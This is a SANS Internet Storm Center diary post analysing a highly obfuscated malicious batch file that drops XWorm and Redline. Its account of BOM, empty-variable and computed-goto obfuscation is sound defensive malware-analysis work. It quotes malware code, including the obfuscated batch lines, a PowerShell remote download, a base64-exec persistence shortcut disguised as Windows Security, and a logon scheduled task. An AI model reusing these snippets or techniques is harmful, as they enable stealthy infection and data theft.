---
title: From Highly Obfuscated Batch File to XWorm and Redline, (Mon, Aug 26th)
url: https://isc.sans.edu/diary/rss/31204
source: SANS Internet Storm Center, InfoCON: green
date: 2024-08-27
fetch_date: 2025-10-06T18:08:29.824857
---

# From Highly Obfuscated Batch File to XWorm and Redline, (Mon, Aug 26th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31200)
* [next](/diary/31208)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [From Highly Obfuscated Batch File to XWorm and Redline](/forums/diary/From%2BHighly%2BObfuscated%2BBatch%2BFile%2Bto%2BXWorm%2Band%2BRedline/31204/)

**Published**: 2024-08-26. **Last Updated**: 2024-08-26 07:01:14 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/From%2BHighly%2BObfuscated%2BBatch%2BFile%2Bto%2BXWorm%2Band%2BRedline/31204/#comments)

If you follow my diaries, you probably already know that one of my favorite topics around malware is obfuscation. I'm often impressed by the crazy techniques attackers use to make reverse engineers' lives more difficult. Last week, I spotted a file called "crypted.bat" (SHA256: 453c017e02e6ce747d605081ad78bf210b3d0004a056d1f65dd1f21c9bf13a9a) which is detected by no antivirus according to VT[[1](https://www.virustotal.com/gui/file/453c017e02e6ce747d605081ad78bf210b3d0004a056d1f65dd1f21c9bf13a9a)]. It deserved to be investigated!

When you open the file in a text editor, you see this:

![](https://isc.sans.edu/diaryimages/images/isc-20240820-1.PNG)

The Byte order mark[[2](https://en.wikipedia.org/wiki/Byte_order_mark)] is the first widespread technique used by the attacker. In this case, UTF-16 (LE) was used (0xFFFE):

```

remnux@remnux:/MalwareZoo/20240820$ xxd crypted.bat | head -3
00000000: fffe 2543 576b 4941 7a6f 7825 3e25 7855  ..%CWkIAzox%>%xU
00000010: 7147 4f63 5425 257a 6341 796d 6d70 6325  qGOcT%%zcAymmpc%
00000020: 6e25 6763 5a53 704a 5065 2525 5243 7361  n%gcZSpJPe%%RCsa
```

If you convert the file into plain ASCII, you get this:

```

%CWkIAzox%>%xUqGOcT%%zcAymmpc%n%gcZSpJPe%%RCsaTkgh%u%NrajlITIN%%FlosuXBh%l%UHWpNytD% %eVMEqNU%2%cfsrQUQzB%%PJakTgn%>%RefSuAz%%SkEtfgeM%&%eSIxMAoMy%%UTYiweX%1%wIwqYvcY% %ZPVOxQb%&%tySQLj
i%%YpbVsTD%&%LowuPzVsi% %dlyCzql%e%WdsbYAngD%%JAVuRTqx%x%qRAdGofXf%%ZlNPHhZ%i%BIHqMIv%%qAEKZwGsL%t%HCJPkwM% %HrmxKzzju%>%tgEGchZJ%%RPgxTsDqd%n%fOSlmwo%%AfRBXJVMr%u%wwuwslz%%ICSPyFU%l%mp
dRSphJ% %ZynhxMK%2%DZjctPXH%%htGVgFpRM%>%SnuoRzrG%%bZgjFPGkJ%&%ZhtxeHp%%AkxdtiEx%1%fusLDeh% %QCHPHPX%|%kohylBV%%yJLIMIwFw%|%DeRJrLcp% %EvtJHRMln%c%xaarmMe%%akERTuAI%l%QojqolGI%%TunxPoBA
A%s%rjpMfvI%

%oapTJQevr%@%WHKNkqk%%oqzVsZQ%e%YmNqtkd%%vdiHhTxI%c%xMvUDbmC%%WCXXQkQk%h%nueJqFl%%fMndPeG%o%WaNiIDzh% %uJeRwam%o%JdBMKkK%%cRDqoXWq%f%YfipIdy%%EOiCmnjqu%f%jtWAxPYHA%
%KzhGwGvJY%s%QMjCtXlpm%%KLXvhlX%^%zbASMkOKb%%MSoRIhosJ%e%oiRdjsAM%%IYWQOGT%t%JuxdyvMM% %nHqJvNFE%/%wJWtubVi%%jRBLVAoKa%^%zotsNYeS%%PKAAtOj%a%lHbOqSQm% %gTRLvMIMh%a%TmYGqwITr%%tFWNDgGm%^
%HAuoqhl%%AahyDuxE%n%brEAKhct%%sPaerVhD%S%PCCfCoV%%xyJnQmpg%=%xyZBFKb%%kgvpqle%0%igJPWFJh%%kHhywwZhj%3%OgmwBJPPO%%xWNiFhcNY%*%ospxJKsVH%%HWwoAYL%0%hqdGiiwS%%NosePdt%x%sTHZaRBmB%%SlmnYHf
%3%EOZLOFflT%%VXgbmxUG%*%MPiWIOc%%kHUfmXe%0%MgkaPLhRY%%wZoyEHqhH%5%rQetBwquH%%eMdBPIjJ%*%oGzpdzdJc%%MPOdsiZQ%0%ruVOBkYqU%%KjFXrbbXb%3%GrywQPHa%%ApGTvfdw%5%hMcgXYFI%%nDAyneTR%*%QkVbhgwb%
%ZlaxGFxhP%0%hVSWhhsi%%NFxCEiojT%x%avtVZdgT%%zOJsMdsiV%9%mIYjXPjXp%%XBPOHkzQR%7%TVTavXb%
%zhDxhLixO%g%WqOitSUcP%%waQfbbZX%o%bYhMmYRJ%%JaLqJhJGK%^%wQcImER%%NjFttczP%t%zNQwEPG%%jckticUQ%^%SJHNHIEd%%QpgXMaZU%O%LYuYeAj% %TIMyhIah%;%kGMHyct% %FQiUhRT%,%wflaxcBC%%xGVWyGydK%,%Ozsp
pQsYA%%jlFOQAm%;%fiDRSuVM% %anS%
:519609

%DgVWcoR%s%ZoIFCLprt%%NntCxCm%e%NgFZpwn%%pyLYsOmAO%^%wdAjOvn%%FFANelC%t%vVpMctJn% %ALLnvmHl%/%mFxhErB%%zqQlKRs%a%myJtTSMTo% %PXuVWTw%a%fFQUkrEpq%%cYZxExF%^%xyNKacYxS%%OWQkNHdZN%N%GbQyEV
Znc%%JxWlmKWiu%^%gpPMNUTz%%cnJkBEKME%S%nyQCCeW%%stOmRCyRR%=%lljWlaa%%MUJYsuW%2%dIgZDUB%%zKFhHQaX%*%qbSVGOmT%%wpkFVpUhQ%2%VeqoxYWD%%SlQwVpsX%*%mBJzSHuCR%%bxXgukkg%2%zSxetVaPj%%kGQLxTcxY%
*%hDmfydQ%%OoXhDbZj%2%ZuhkxkEp%%xITWbJnYV%*%FXnJHNc%%ixLinKshS%0%DnoYFgL%%fSqOFgB%5%Xapkdbgb%%LxvKpZFaN%*%ePDNvAP%%AFDBLDAG%0%oYYBmwfe%%Qdiujzov%2%lWWUzOnsT%%SlVybcJx%3%xZiUqrR%%mlzpecC
pj%*%xCQyduGrX%%oAbeUiyIE%(%QeZtONu%%ZcgvICAx%0%nhOmDybFj%%jjUoKBsu%6%fkjNdnHSc%%UGcGIqN%2%owehgYFDL%%FUwxiPOW%0%ikcPJSh%%pKQMamsY%^%PCQNlJF%%MbIYdjP%^%NmCLQGrsA%%uLrORben%0%wOOPMHXa%%e
bFjSHOd%x%DdLTfYUW%%eFUkTQXc%8%PlNXoGxZ%%iZoIjTGWG%b%hPytbQcp%%wOoGCuJ%)%qMzNOpWLK%
%EYUngJPBb%g%xtyhGUl%%RUGmrEQws%^%RRahjnG%%coXzOZPxy%O%znjAGFDUI%%TNHDTjQ%t%buwgVewv%%EhyQGHFA%^%MRCzzkdFZ%%PXScpQWPR%O%mDzExmBGg% %aEXetltkX%;%XRCvjYb% %NEAOkHpfx%,%Scqfgqhl%%nexdrDtk%
;%GqOiFqUN%%rQyHZCT%;%lXGsxpKk%%PtFrFcYDl%,%GNEWsWFT% %AnS%
:512015
```

It still hurts! The second obfuscation technique is the use of empty environment variables (%xxx%). When Windows interprets this batch file, any empty (non-existing) variable will be simply ignored. Let's get rid of them using a simple regular expression:

```

remnux@remnux:/MalwareZoo/20240820$ sed -E "s/%\w{5,}%//g" crypted-ascii.bat | head -10
>nul 2>&1 && exit >nul 2>&1 || cls

@echo off
s^et /^a a^nS=03*0x3*05*035*0x97
go^t^O ; ,,; %anS%
:519609

se^t /a a^N^S=2*2*2*2*05*023*(0620^^0x8b)
g^Ot^O ; ,;;, %AnS%
```

We start to understand the code but still hard to read! The script will compute "addresses" where to jump based on "goto" instructions and labels:

```

C:\Users\REM\Desktop>s^et /^a a^nS=03*0x3*05*035*0x97
197055
```

The script will generate labels on the fly and jump forward and backward in the script to perform its malicious activities:

```

set /a anS=03*0x3*05*035*0x97
gotO ; ,,; 197055
set /a ans=0x3*(0545^036)*(0750^041)
goto 519609
set /a aNS=2*2*2*2*05*023*(0620^0x8b)
gOtO ; ,;;, 430160
for /L %n in (87 87 87) do (set "i=a"  )
(set "i=a"  )
set /a ans=05*07*~-14630
goto 512015
set /a aNs=0x11*045*(0343^0x1be)
goTo ; ; ; 219521
for /L %x in (792 792 792) do (set "j=b"  )
(set "j=b"  )
set /a ans=2*05*0x5*(0x5621^0x1ce2)
goto 956950
set /a ans=2*0xb*027*((0x170^0x18c8)>>3)
gOto , ; 416438
for /L %l in (579 579 579) do (set "k=c"  )
(set "k=c"  )
set /a ans=0x200*05*~-282
goto 719360
set /a anS=2*2*05*(0xdf47^0x7c3c)
goto ; , 837020
for /L %l in (783 783 783) do (set "l=d"  )
(set "l=d"  )
```

The next commands will be reconstructed by creating more environment variables! This is pretty difficult to analyze. Let's speed up a bit.

Many batch files on Windows close their window once completed. To prevent this, here is a quick tip. First, re-enable the display of commands by removing the "@echo off" commands then run the scripts with a "cmd /k". This will prevent the window from being closed at the end of the script!

Once you execute the script, it's always good to keep an eye on the system activity. Here, we will face a nice lists of processes:

![](https://isc.sans.edu/diaryimages/images/isc-20240820-2.PNG)

Let's review some capabilities of the script:

First, a static Python environment will be deployed:

```

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
(New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/LoneNone1807/RedAV/raw/main/Python310.zip', [System.IO.Path]::GetTempPath() + 'Python310.zip') "
```

Persistence will be implemented via a scheduled task:

```

$s = $payload = "import base64;exec(base64.b64decode('aW1wb3J0IHVybGxpYi5yZ ... (removed) ... uZGVjb2RlKCd1dGYtOCcpKSk='))";
$obj = New-Object -ComObject WScript.Shell;
$link = $obj.CreateShortcut("$env:LOCALAPPDATA\WindowsSecurity.lnk");
$link.WindowStyle = 7;
$link.TargetPath = "$env:LOCALAPPDATA\Programs\Python\Python310\pythonw.exe";
$link.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13";
$link.Arguments = "-c `"$payload`"";
$link.Save() "
```

Followed by:

```

schtasks /create /tn "Windows Security" /sc ONLOGON /tr "C:\Users\admin\AppData\Lo...